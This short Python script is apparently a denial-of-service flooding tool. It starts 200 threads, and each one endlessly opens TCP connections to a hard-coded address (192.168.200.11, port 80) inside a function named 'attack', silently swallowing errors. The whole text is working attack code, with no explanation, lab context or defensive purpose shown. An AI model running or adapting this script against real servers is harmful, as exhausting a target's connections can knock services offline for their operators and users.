import socket
import threading

target_ip = "192.168.200.11"
target_port = 80

def attack():
    while True:
        try:
            s = socket.socket()
            s.connect((target_ip, target_port))
        except:
            pass

for _ in range(200):
    threading.Thread(target=attack).start()
